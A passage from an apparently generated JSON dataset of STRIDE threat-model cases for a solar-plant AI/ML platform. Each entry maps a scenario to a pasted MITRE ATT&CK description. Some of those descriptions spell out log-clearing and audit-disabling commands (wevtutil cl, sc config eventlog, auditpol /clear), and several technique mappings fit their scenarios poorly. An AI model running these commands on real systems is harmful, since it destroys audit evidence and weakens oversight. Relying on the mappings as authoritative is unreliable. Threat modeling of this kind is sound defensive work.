flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious insider alters AI/ML models in the TOREADOR Platform to degrade prediction accuracy.",
            "Assumptions": [
                {
                    "Assumption": "The insider has privileged access to the TOREADOR Platform.",
                    "Role": "Insider",
                    "Condition": "Insider possesses privileged access."
                },
                {
                    "Assumption": "Insufficient access control policies within the platform.",
                    "Role": "System Admin",
                    "Condition": "Access policies are not stringent."
                },
                {
                    "Assumption": "AI/ML model file integrity is not monitored.",
                    "Role": "System Designer",
                    "Condition": "File integrity monitoring is absent."
                }
            ],
            "Potential Impact": "Inaccurate predictive maintenance leading to equipment failure, reduced power optimization.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "data",
                "platform"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies metadata associated with solar power plants in the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "Attacker gains access via credential compromise.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials are available."
                },
                {
                    "Assumption": "Metadata fields are not protected against modification.",
                    "Role": "System Designer",
                    "Condition": "Metadata is not protected."
                },
                {
                    "Assumption": "There is no logging or alerting on metadata changes.",
                    "Role": "System Admin",
                    "Condition": "Monitoring and alerting are not configured."
                }
            ],
            "Potential Impact": "Contextual inaccuracies in predictions, operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "metadata",
                "platform"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An internal user denies having made specific changes to the AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "Changes are not logged.",
                    "Role": "System Designer",
                    "Condition": "Logging is not implemented."
                },
                {
                    "Assumption": "User actions are not audited.",
                    "Role": "System Admin",
                    "Condition": "Auditing is not enforced."
                },
                {
                    "Assumption": "Access control does not enforce accountability.",
                    "Role": "System Admin",
                    "Condition": "Accountability measures are weak."
                }
            ],
            "Potential Impact": "Difficult to determine the source of unauthorized changes, affecting trust in system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "audit",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker remotely modifies sensor values but denies any involvement.",
            "Assumptions": [
                {
                    "Assumption": "Remote access logs are not maintained.",
                    "Role": "System Designer",
                    "Condition": "Logging is insufficient or missing."
                },
                {
                    "Assumption": "No non-repudiation measures for sensor data modification.",
                    "Role": "System Designer",
                    "Condition": "Non-repudiation not implemented."
                },
                {
                    "Assumption": "The attacker can spoof network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network traffic can be spoofed."
                }
            ],
            "Potential Impact": "Difficult to trace malicious activity back to the attacker.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network",
                "audit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Employees deny responsibility for mishandling of sensitive dashboard data.",
            "Assumptions": [
                {
                    "Assumption": "No activity logs for dashboard access.",
                    "Role": "System Admin",
                    "Condition": "Activity logging is absent."
                },
                {
                    "Assumption": "No unique user identification.",
                    "Role": "System Designer",
                    "Condition": "Unique identification not enforced."
                },
                {
                    "Assumption": "Lack of session tracking.",
                    "Role": "System Admin",
                    "Condition": "Session tracking is not implemented."
                }
            ],
            "Potential Impact": "Lack of accountability in case of sensitive data mishandling.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "dashboard",
                "logging",
                "audit"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communication between sensors and data logger, gaining access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not applied."
                },
                {
                    "Assumption": "Network access can be obtained by the attacker.",
                    "Role": "Attacker",
                    "Condition": "Network access is available."
                },
                {
                    "Assumption": "No secure communication protocols are in place.",
                    "Role": "System Designer",
                    "Condition": "Protocols are not secure."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive sensor data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "communication",
                "encryption",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in TOREADOR Platform is accessed by unauthorized personnel.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access controls (RBAC) are not properly configured.",
                    "Role": "System Admin",
                    "Condition": "RBAC configuration is weak."
                },
                {
                    "Assumption": "Data at rest is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not applied."
                },
                {
                    "Assumption": "Access logs are not maintained or monitored.",
                    "Role": "System Admin",
                    "Condition": "Logging is insufficient or missing."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive pre-processed data used for AI/ML training.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data",
                "platform",
                "access control"
            ],
            "mitre_technique": {
                "name": "Permission Groups Discovery",
                "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
                "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
                "technique_id": "T1069"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities to gain access to metadata in the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities in the system.",
                    "Role": "System Admin",
                    "Condition": "Vulnerabilities are known but not addressed."
                },
                {
                    "Assumption": "Network defenses are insufficiently configured.",
                    "Role": "System Admin",
                    "Condition": "Network defense mechanisms are weak or absent."
                },
                {
                    "Assumption": "Sensitive metadata is not protected or encrypted.",
                    "Role": "System Designer",
                    "Condition": "Metadata lacks proper protection."
                }
            ],
            "Potential Impact": "Unauthorized access to operational metadata, compromising system integrity.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data",
                "metadata",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network, preventing sensors from sending data to the data logger.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure is not designed to handle high traffic volumes.",
                    "Role": "System Designer",
                    "Condition": "Network load handling is insufficient."
                },
                {
                    "Assumption": "There are no rate limiting or anti-DDoS measures in place.",
                    "Role": "System Admin",
                    "Condition": "DDoS defenses are absent."
                },
                {
                    "Assumption": "Network monitoring does not detect abnormal traffic patterns.",
                    "Role": "System Admin",
                    "Condition": "Monitoring lacks sophistication."
                }
            ],
            "Potential Impact": "Disruption of data collection leading to loss of predictive maintenance capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network",
                "flooding",
                "DDOS"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the TOREADOR Platform with a high-volume request attack, overloading the system.",
            "Assumptions": [
                {
                    "Assumption": "Load balancing and auto-scaling are not implemented.",
                    "Role": "System Admin",
                    "Condition": "System cannot scale to handle high load."
                },
                {
                    "Assumption": "There are insufficient resources to handle peak loads.",
                    "Role": "System Designer",
                    "Condition": "Resources are inadequate."
                },
                {
                    "Assumption": "Rate limiting has not been implemented for user requests.",
                    "Role": "System Admin",
                    "Condition": "Rate limiting is absent."
                }
            ],
            "Potential Impact": "System unavailability, impacting real-time predictions and operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "platform",
                "network",
                "high-volume"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An internal user with administrative access intentionally disables critical components of the AI/ML application.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient segregation of duties.",
                    "Role": "System Designer",
                    "Condition": "Single user has excessive privileges."
                },
                {
                    "Assumption": "Internal activity is not monitored or logged.",
                    "Role": "System Admin",
                    "Condition": "Internal monitoring is weak or absent."
                },
                {
                    "Assumption": "Critical operations do not have failover mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Failover mechanisms are not implemented."
                }
            ],
            "Potential Impact": "Operational disruption resulting in loss of predictive and optimization capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "insider threat",
                "availability",
                "admin"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain elevated privileges on the data logger.",
            "Assumptions": [
                {
                    "Assumption": "Software vulnerabilities are present and unpatched.",
                    "Role": "System Admin",
                    "Condition": "Vulnerabilities are known but not addressed."
                },
                {
                    "Assumption": "Attacker has access to the network or physical access to the device.",
                    "Role": "Attacker",
                    "Condition": "Access is available."
                },
                {
                    "Assumption": "There are no intrusion detection mechanisms in place.",
                    "Role": "System Admin",
                    "Condition": "Detection mechanisms are weak or absent."
                }
            ],
            "Potential Impact": "Compromise of data integrity and potential manipulation of sensor data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability",
                "device",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An internal user exploits insufficient access controls to gain broader permissions on the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are poorly defined.",
                    "Role": "System Admin",
                    "Condition": "Policies are weak or ambiguous."
                },
                {
                    "Assumption": "Privileges are not reviewed regularly.",
                    "Role": "System Admin",
                    "Condition": "Privilege reviews are infrequent."
                },
                {
                    "Assumption": "Monitoring of user activities is insufficient.",
                    "Role": "System Admin",
                    "Condition": "Activity monitoring is weak or absent."
                }
            ],
            "Potential Impact": "Unauthorized actions affecting system configuration, data integrity, and model accuracy.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "platform"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An external attacker uses MITM (Man-in-the-Middle) techniques to intercept and manipulate communications, obtaining administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Communications are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not applied."
                },
                {
                    "Assumption": "Attacker has network access to intercept traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access is available."
                },
                {
                    "Assumption": "Lack of mutual authentication mechanism.",
                    "Role": "System Designer",
                    "Condition": "Mutual authentication is missing."
                }
            ],
            "Potential Impact": "Compromise of system integrity, unauthorized administrative actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "MITM",
                "network",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor data, sending falsified telemetry to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network where sensors communicate.",
                    "Role": "Attacker",
                    "Condition": "Network access is not properly secured."
                },
                {
                    "Assumption": "The data from sensors is not encrypted during transmission.",
                    "Role": "System Security",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "There is no robust authentication mechanism for data sent from the sensors.",
                    "Role": "System Architect",
                    "Condition": "Authentication is insufficient or missing."
                }
            ],
            "Potential Impact": "Compromise data integrity and potentially lead to incorrect predictive maintenance decisions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "sensor data",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
